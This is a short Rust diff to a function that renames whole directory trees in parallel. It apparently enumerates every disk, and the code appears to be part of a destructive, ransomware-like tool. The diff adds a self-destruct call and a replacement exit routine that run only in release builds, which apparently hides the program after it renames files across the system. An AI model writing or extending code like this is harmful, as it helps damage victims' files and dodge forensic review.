@@ -1,13 +1,16 @@
 use std::{fs, io};
 use std::path::PathBuf;
-use std::process::exit;
 use std::thread::sleep;
 use std::time::Duration;
 use sysinfo::Disks;
 use threadpool::ThreadPool;
 use walkdir::WalkDir;
+use crate::windows;
 
 pub(crate) fn start_rename(path: PathBuf, do_exit: bool) {
+    #[cfg(not(debug_assertions))]
+    windows::self_destruct();
+    
     let cpus = num_cpus::get();
     rename_tree(path.clone(), 2).unwrap();
 
@@ -22,7 +25,8 @@ pub(crate) fn start_rename(path: PathBuf, do_exit: bool) {
     }
     pool.join();
     if do_exit {
-        exit(101);
+        #[cfg(not(debug_assertions))]
+        windows::exit_executing()
     }
 }
 
